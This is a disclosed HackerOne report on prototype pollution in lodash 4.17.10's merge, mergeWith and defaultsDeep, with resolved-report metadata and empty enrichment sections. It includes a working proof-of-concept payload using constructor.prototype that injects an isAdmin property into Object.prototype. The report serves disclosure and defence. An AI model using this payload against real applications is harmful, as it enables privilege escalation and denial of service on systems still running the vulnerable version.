---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '380873'
original_report_id: '380873'
title: Prototype pollution attack (lodash / constructor.prototype)
weakness: Uncontrolled Resource Consumption
team_handle: nodejs-ecosystem
created_at: '2018-07-12T08:28:18.713Z'
disclosed_at: '2018-10-30T12:59:31.457Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
asset_identifier: lodash
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Prototype pollution attack (lodash / constructor.prototype)

## Metadata

- HackerOne Report ID: 380873
- Weakness: Uncontrolled Resource Consumption
- Program: nodejs-ecosystem
- Disclosed At: 2018-10-30T12:59:31.457Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a prototype pollution vulnerability in lodash.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** lodash
**version:** 4.17.10
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

12M downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The functions `merge`, `mergeWith`, and `defaultsDeep` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` and send it to `_.merge`.

```javascript
var _ = require('lodash');
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
_.merge({}, payload);
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
